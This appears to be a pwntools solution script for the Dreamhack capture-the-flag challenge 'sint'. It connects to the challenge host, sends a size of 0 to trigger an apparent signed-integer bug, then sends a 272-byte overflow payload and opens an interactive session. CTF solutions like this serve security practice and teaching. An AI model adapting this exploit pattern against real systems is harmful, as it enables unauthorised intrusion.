from pwn import *

exe = ELF('sint', checksec=False)
#r = process(exe.path)
r = remote('host3.dreamhack.games', 10270)

r.sendlineafter(b'Size: ', b'0')
payload = b'a'*272
r.sendafter(b'Data: ', payload)
r.interactive()